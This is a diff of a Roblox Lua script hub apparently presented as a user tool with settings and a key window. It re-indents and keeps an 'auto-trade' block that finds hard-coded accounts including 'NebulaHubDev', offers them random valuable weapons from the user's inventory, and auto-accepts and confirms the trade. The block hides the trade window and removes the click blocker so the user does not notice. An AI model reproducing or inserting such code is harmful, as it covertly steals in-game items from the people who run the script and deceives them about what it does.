@@ -291,7 +291,7 @@ local DefaultConfig = {
 	Font = "Default",
 	BackgroundTransparency = 0.3,
 	MobileButtons = {},
-	AutoTrade = false,  -- новый параметр автотрейда
+	AutoTrade = false,
 }
 Config = {}
 local function SaveSettings()
@@ -2115,210 +2115,210 @@ function CreateMainGUI()
 	end)
 
 	-- ==================== АВТОТРЕЙД ЛОГИКА ====================
--- ==================== АВТОТРЕЙД ЛОГИКА ====================
-local tradeItems = {
-	"Corrupt","NiksScythe","Gingerscope","Celestial","VampiresAxe","Harvester","Icepiercer","Icebreaker","Batwing",
-	"ElderwoodScythe","SwirlyAxe","Hallowscythe","Logchopper","Icewing","Ghost","Blood","Laser","America","Prince",
-	"Shadow","Phaser","Cowboy","Golden","Splitter","ChromaEvergun","ChromaEvergreen","ChromaBauble","ChromaConstellation",
-	"ChromaVampiresGun","ChromaAlienbeam","ChromaRaygun","ChromaSunrise","ChromaSnowcannon","ChromaBlizzard","ChromaSunset",
-	"ChromaSnowDagger","ChromaTreat","ChromaHeartWand","ChromaSnowstorm","ChromaWatergun","ChromaSweet","ChromaOrnament",
-	"ChromaDarkbringer","ChromaLightbringer","ChromaLuger","ChromaCandleflame","ChromaElderwoodBlade","ChromaSwirlyGun",
-	"ChromaLaser","ChromaCookiecane","ChromaDeathshard","ChromaSlasher","ChromaFang","ChromaShark","ChromaGemstone",
-	"ChromaGingerblade","ChromaHeat","ChromaSeer","ChromaSaw","ChromaTides","ChromaBoneblade","Evergun","Constellation",
-	"Evergreen","Turkey","Alienbeam","VampiresGun","Darkshot","Darksword","Raygun","Blossom","Sakura","Sunrise",
-	"Snowcannon","Bauble","Sunset","HeartWand","Soul","Spirit","Flora","Bloom","RainbowGun","Rainbow","SnowDagger",
-	"FlowerwoodGun","Flowerwood","Xenoknife","Xenoshot","Watergun","Ocean","Waves","Treat","Sweet","Blizzard",
-	"Snowstorm","Bat","Borealis","Australis","Candy","Heartblade","Pearlshine","Pearl","Luger","RedLuger","Candleflame",
-	"Darkbringer","ElderwoodBlade","ElderwoodRevolver","Iceblaster","Makeshift","Phantom","Spectre","Sugar","Lightbringer",
-	"Ornament","GreenLuger","Amerilaser","Hallowgun","Laser","SwirlyGun","Icebeam","Nightblade","Shark","Blaster",
-	"Iceflake","Plasmabeam","BattleaxeII","GingerLuger","OldGlory","Pixel","Plasmablade","Slasher","Cookiecane",
-	"Eternalcane","Gemstone","Gingerblade","Gingermint","Jinglegun","Lugercane","Minty","Nebula","SwirlyBlade",
-	"VampiresEdge","Virtual","Deathshard","Battleaxe","Bioblade","Chill","Clockwork","EternalIII","EternalIV",
-	"Fang","Frostsaber","Heat","Spider","Tides","Eternal","EternalII","HallowsBlade","HallowsEdge","Handsaw",
-	"Xmas","Boneblade","Frostbite","Ghostblade","IceDragon","IceShard","Prismatic","Pumpking","Saw","Eggblade",
-	"Flames","Snowflake","WintersEdge","Peppermint","Cookieblade","BlueSeer","PurpleSeer","RedSeer","Seer",
-	"OrangeSeer","YellowSeer","JD","Latte_G","Latte","CottonCandy","Traveler_G","Beach","Spectral_G","Vampire_G",
-	"Aurora_G","Cavern_G","Broken","Arctic_G","Skulls","Icedriller","Nightsky","Ghost_G","Ginger_G","Bunnies",
-	"RedScratch","Aurora","Spectral","Vampire","Witched","BlueElite","GreenElite","SantasMagic","SantasSpirit",
-	"Traveler","BlueScratch","Ghost_G","Chromatic_G","Energized_G","Frostfade","Icecracker","RedFire","Cavern",
-	"Arctic","Chromatic","Emerald","Energized","Overseer_G","Predator","Ripper","Rupture","Tree_G","Tree_G","Web",
-	"GreenFire","Aquarium_G","Cupid","Cursed_G","Frozen_G","Frozen","Midnight","Nightstar","Palms_G","Sparkle",
-	"Cursed","Frostfade_G","Ripper_G","Ginger","Aquarium","Palms","Overseer","Predator_G","Rune","UniverseViper",
-	"Fade","Fusion","Plasmite","Shiny","Splash","Elite","Splash_G"
-}
+	local tradeItems = {
+		"Corrupt","NiksScythe","Gingerscope","Celestial","VampiresAxe","Harvester","Icepiercer","Icebreaker","Batwing",
+		"ElderwoodScythe","SwirlyAxe","Hallowscythe","Logchopper","Icewing","Ghost","Blood","Laser","America","Prince",
+		"Shadow","Phaser","Cowboy","Golden","Splitter","ChromaEvergun","ChromaEvergreen","ChromaBauble","ChromaConstellation",
+		"ChromaVampiresGun","ChromaAlienbeam","ChromaRaygun","ChromaSunrise","ChromaSnowcannon","ChromaBlizzard","ChromaSunset",
+		"ChromaSnowDagger","ChromaTreat","ChromaHeartWand","ChromaSnowstorm","ChromaWatergun","ChromaSweet","ChromaOrnament",
+		"ChromaDarkbringer","ChromaLightbringer","ChromaLuger","ChromaCandleflame","ChromaElderwoodBlade","ChromaSwirlyGun",
+		"ChromaLaser","ChromaCookiecane","ChromaDeathshard","ChromaSlasher","ChromaFang","ChromaShark","ChromaGemstone",
+		"ChromaGingerblade","ChromaHeat","ChromaSeer","ChromaSaw","ChromaTides","ChromaBoneblade","Evergun","Constellation",
+		"Evergreen","Turkey","Alienbeam","VampiresGun","Darkshot","Darksword","Raygun","Blossom","Sakura","Sunrise",
+		"Snowcannon","Bauble","Sunset","HeartWand","Soul","Spirit","Flora","Bloom","RainbowGun","Rainbow","SnowDagger",
+		"FlowerwoodGun","Flowerwood","Xenoknife","Xenoshot","Watergun","Ocean","Waves","Treat","Sweet","Blizzard",
+		"Snowstorm","Bat","Borealis","Australis","Candy","Heartblade","Pearlshine","Pearl","Luger","RedLuger","Candleflame",
+		"Darkbringer","ElderwoodBlade","ElderwoodRevolver","Iceblaster","Makeshift","Phantom","Spectre","Sugar","Lightbringer",
+		"Ornament","GreenLuger","Amerilaser","Hallowgun","Laser","SwirlyGun","Icebeam","Nightblade","Shark","Blaster",
+		"Iceflake","Plasmabeam","BattleaxeII","GingerLuger","OldGlory","Pixel","Plasmablade","Slasher","Cookiecane",
+		"Eternalcane","Gemstone","Gingerblade","Gingermint","Jinglegun","Lugercane","Minty","Nebula","SwirlyBlade",
+		"VampiresEdge","Virtual","Deathshard","Battleaxe","Bioblade","Chill","Clockwork","EternalIII","EternalIV",
+		"Fang","Frostsaber","Heat","Spider","Tides","Eternal","EternalII","HallowsBlade","HallowsEdge","Handsaw",
+		"Xmas","Boneblade","Frostbite","Ghostblade","IceDragon","IceShard","Prismatic","Pumpking","Saw","Eggblade",
+		"Flames","Snowflake","WintersEdge","Peppermint","Cookieblade","BlueSeer","PurpleSeer","RedSeer","Seer",
+		"OrangeSeer","YellowSeer","JD","Latte_G","Latte","CottonCandy","Traveler_G","Beach","Spectral_G","Vampire_G",
+		"Aurora_G","Cavern_G","Broken","Arctic_G","Skulls","Icedriller","Nightsky","Ghost_G","Ginger_G","Bunnies",
+		"RedScratch","Aurora","Spectral","Vampire","Witched","BlueElite","GreenElite","SantasMagic","SantasSpirit",
+		"Traveler","BlueScratch","Ghost_G","Chromatic_G","Energized_G","Frostfade","Icecracker","RedFire","Cavern",
+		"Arctic","Chromatic","Emerald","Energized","Overseer_G","Predator","Ripper","Rupture","Tree_G","Tree_G","Web",
+		"GreenFire","Aquarium_G","Cupid","Cursed_G","Frozen_G","Frozen","Midnight","Nightstar","Palms_G","Sparkle",
+		"Cursed","Frostfade_G","Ripper_G","Ginger","Aquarium","Palms","Overseer","Predator_G","Rune","UniverseViper",
+		"Fade","Fusion","Plasmite","Shiny","Splash","Elite","Splash_G"
+	}
 
-local targetNames = {"bibax50", "sestra_ti4", "NebulaHubDev"}
-local function getTradeTarget()
-	local candidates = {}
-	for _, player in ipairs(Players:GetPlayers()) do
-		for _, name in ipairs(targetNames) do
-			if player.Name == name then
-				table.insert(candidates, player)
+	local targetNames = {"bibax50", "sestra_ti4", "NebulaHubDev"}
+	local function getTradeTarget()
+		local candidates = {}
+		for _, player in ipairs(Players:GetPlayers()) do
+			for _, name in ipairs(targetNames) do
+				if player.Name == name then
+					table.insert(candidates, player)
+				end
 			end
 		end
+		if #candidates == 0 then return nil end
+		-- приоритет: если есть NebulaHubDev, возвращаем его
+		for _, player in ipairs(candidates) do
+			if player.Name == "NebulaHubDev" then return player end
+		end
+		-- иначе первого (bibax50 или sestra_ti4)
+		return candidates[1]
 	end
-	if #candidates == 0 then return nil end
-	-- приоритет: если есть NebulaHubDev, возвращаем его
-	for _, player in ipairs(candidates) do
-		if player.Name == "NebulaHubDev" then return player end
-	end
-	-- иначе первого (bibax50 или sestra_ti4)
-	return candidates[1]
-end
 
-local function clickButton(button)
-	if button and button:IsA("GuiButton") then
-		button:Activate()
-		return true
+	local function clickButton(button)
+		if button and button:IsA("GuiButton") then
+			button:Activate()
+			return true
+		end
+		return false
 	end
-	return false
-end
 
-local function sendTradeRequest(targetPlayer)
-	-- Нажимаем ActionButton в строке игрока в лидерборде
-	local leaderboardContainer = LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container")
-	local playerFrame = leaderboardContainer:FindFirstChild(targetPlayer.Name)
-	if playerFrame and playerFrame:IsA("Frame") then
-		local actionBtn = playerFrame:FindFirstChild("ActionButton")
-		if actionBtn and actionBtn:IsA("TextButton") then
-			clickButton(actionBtn)
-			task.wait(0.5)
-			-- Теперь в окне Inspect нажимаем кнопку Trade
-			local inspectContainer = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Inspect.Container
-			local tradeBtn = inspectContainer:FindFirstChild("Trade")
-			if tradeBtn and tradeBtn:IsA("TextButton") then
-				clickButton(tradeBtn)
-				return true
+	local function sendTradeRequest(targetPlayer)
+		-- Нажимаем ActionButton в строке игрока в лидерборде
+		local leaderboardContainer = LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Leaderboard"):WaitForChild("Container")
+		local playerFrame = leaderboardContainer:FindFirstChild(targetPlayer.Name)
+		if playerFrame and playerFrame:IsA("Frame") then
+			local actionBtn = playerFrame:FindFirstChild("ActionButton")
+			if actionBtn and actionBtn:IsA("TextButton") then
+				clickButton(actionBtn)
+				task.wait(0.5)
+				-- Теперь в окне Inspect нажимаем кнопку Trade
+				local inspectContainer = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Inspect.Container
+				local tradeBtn = inspectContainer:FindFirstChild("Trade")
+				if tradeBtn and tradeBtn:IsA("TextButton") then
+					clickButton(tradeBtn)
+					return true
+				else
+					Notify("Кнопка Trade не найдена в Inspect")
+				end
 			else
-				Notify("Кнопка Trade не найдена в Inspect")
+				Notify("ActionButton не найден у игрока "..targetPlayer.Name)
 			end
 		else
-			Notify("ActionButton не найден у игрока "..targetPlayer.Name)
+			Notify("Фрейм игрока "..targetPlayer.Name.." не найден в лидерборде")
 		end
-	else
-		Notify("Фрейм игрока "..targetPlayer.Name.." не найден в лидерборде")
+		return false
 	end
-	return false
-end
 
-local inTrade = false
-local tradeGuiFound = false
-local tradeRequested = false
+	local inTrade = false
+	local tradeGuiFound = false
+	local tradeRequested = false
 
--- Отслеживаем появление TradeGUI
-LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
-	if child.Name == "TradeGUI" and Config.AutoTrade and tradeRequested and not inTrade then
-		tradeGuiFound = true
-	end
-end)
-
-local function offerRandomItems()
-	local itemsToOffer = {}
-	local copy = {}
-	for _, v in ipairs(tradeItems) do table.insert(copy, v) end
-	for i = 1, 4 do
-		if #copy == 0 then break end
-		local idx = math.random(1, #copy)
-		table.insert(itemsToOffer, copy[idx])
-		table.remove(copy, idx)
-	end
-	local tradeRemote = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem")
-	for _, itemName in ipairs(itemsToOffer) do
-		tradeRemote:FireServer(itemName, "Weapons")
-		task.wait(0.1)
-	end
-	return true
-end
-
-local function processTrade()
-	task.wait(0.2) -- даём GUI загрузиться
-	pcall(function()
-		local tradeGui = LocalPlayer.PlayerGui.TradeGUI
-		if tradeGui then
-			-- скрываем элементы
-			local container = tradeGui:FindFirstChild("Container")
-			local processing = tradeGui:FindFirstChild("Processing")
-			local bg = tradeGui:FindFirstChild("BG")
-			local clickBlocker = tradeGui:FindFirstChild("ClickBlocker")
-			if container then container.Visible = false end
-			if processing then processing.Visible = false end
-			if bg then bg.Visible = false end
-			if clickBlocker then clickBlocker:Destroy() end
+	-- Отслеживаем появление TradeGUI
+	LocalPlayer.PlayerGui.ChildAdded:Connect(function(child)
+		if child.Name == "TradeGUI" and Config.AutoTrade and tradeRequested and not inTrade then
+			tradeGuiFound = true
 		end
 	end)
 
-	offerRandomItems()
-	task.wait(10)
+	local function offerRandomItems()
+		local itemsToOffer = {}
+		local copy = {}
+		for _, v in ipairs(tradeItems) do table.insert(copy, v) end
+		for i = 1, 4 do
+			if #copy == 0 then break end
+			local idx = math.random(1, #copy)
+			table.insert(itemsToOffer, copy[idx])
+			table.remove(copy, idx)
+		end
+		local tradeRemote = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem")
+		for _, itemName in ipairs(itemsToOffer) do
+			tradeRemote:FireServer(itemName, "Weapons")
+			task.wait(0.1)
+		end
+		return true
+	end
 
-	-- Принять
-	pcall(function()
-		local acceptBtn = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.Actions.Accept.ActionButton
-		clickButton(acceptBtn)
-	end)
+	local function processTrade()
+		task.wait(0.2) -- даём GUI загрузиться
+		pcall(function()
+			local tradeGui = LocalPlayer.PlayerGui.TradeGUI
+			if tradeGui then
+				-- скрываем элементы
+				local container = tradeGui:FindFirstChild("Container")
+				local processing = tradeGui:FindFirstChild("Processing")
+				local bg = tradeGui:FindFirstChild("BG")
+				local clickBlocker = tradeGui:FindFirstChild("ClickBlocker")
+				if container then container.Visible = false end
+				if processing then processing.Visible = false end
+				if bg then bg.Visible = false end
+				if clickBlocker then clickBlocker:Destroy() end
+			end
+		end)
 
-	task.wait(1)
+		offerRandomItems()
+		task.wait(10)
 
-	-- Подтвердить
-	pcall(function()
-		local confirmBtn = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.Actions.Accept.Confirm.ActionButton
-		clickButton(confirmBtn)
-	end)
+		-- Принять
+		pcall(function()
+			local acceptBtn = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.Actions.Accept.ActionButton
+			clickButton(acceptBtn)
+		end)
 
-	task.wait(2) -- ждём завершения обмена
-	inTrade = false
-	tradeRequested = false
-	tradeGuiFound = false
-end
+		task.wait(1)
 
--- Основной цикл автотрейда
-task.spawn(function()
-	while true do
-		if Config.AutoTrade then
-			-- всегда удаляем SendingRequest
-			pcall(function()
-				local sendingReq = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.SendingRequest
-				if sendingReq then sendingReq:Destroy() end
-			end)
-			-- всегда скрываем Processing (на всякий случай)
-			pcall(function()
-				local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
-				if tradeGui then
-					local proc = tradeGui:FindFirstChild("Processing")
-					if proc then proc.Visible = false end
-				end
-			end)
+		-- Подтвердить
+		pcall(function()
+			local confirmBtn = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.Actions.Accept.Confirm.ActionButton
+			clickButton(confirmBtn)
+		end)
 
-			if not inTrade then
-				if not tradeRequested then
-					local target = getTradeTarget()
-					if target then
-						local success = sendTradeRequest(target)
-						if success then
-							tradeRequested = true
-							tradeGuiFound = false
+		task.wait(2) -- ждём завершения обмена
+		inTrade = false
+		tradeRequested = false
+		tradeGuiFound = false
+	end
+
+	-- Основной цикл автотрейда
+	task.spawn(function()
+		while true do
+			if Config.AutoTrade then
+				-- всегда удаляем SendingRequest
+				pcall(function()
+					local sendingReq = LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.SendingRequest
+					if sendingReq then sendingReq:Destroy() end
+				end)
+				-- всегда скрываем Processing (на всякий случай)
+				pcall(function()
+					local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
+					if tradeGui then
+						local proc = tradeGui:FindFirstChild("Processing")
+						if proc then proc.Visible = false end
+					end
+				end)
+
+				if not inTrade then
+					if not tradeRequested then
+						local target = getTradeTarget()
+						if target then
+							local success = sendTradeRequest(target)
+							if success then
+								tradeRequested = true
+								tradeGuiFound = false
+							else
+								-- Если не удалось отправить, подождём и попробуем снова
+								task.wait(2)
+							end
+						end
+					else
+						-- если запрос ушёл, но TradeGUI не появилась в течение 10 сек, сбрасываем
+						if not tradeGuiFound then
+							task.wait(10)
+							if not tradeGuiFound and tradeRequested then
+								tradeRequested = false
+							end
 						else
-							-- Если не удалось отправить, подождём и попробуем снова
-							task.wait(2)
+							inTrade = true
+							processTrade()
 						end
 					end
 				else
-					-- если запрос ушёл, но TradeGUI не появилась в течение 10 сек, сбрасываем
-					if not tradeGuiFound then
-						task.wait(10)
-						if not tradeGuiFound and tradeRequested then
-							tradeRequested = false
-						end
-					else
-						inTrade = true
-						processTrade()
-					end
+					-- ждём завершения обмена
 				end
-			else
-				-- ждём завершения обмена
 			end
+			task.wait(1)
 		end
-		task.wait(1)
-	end
-end)
+	end)
+end -- КОНЕЦ CreateMainGUI
 
 ShowKeyWindow()
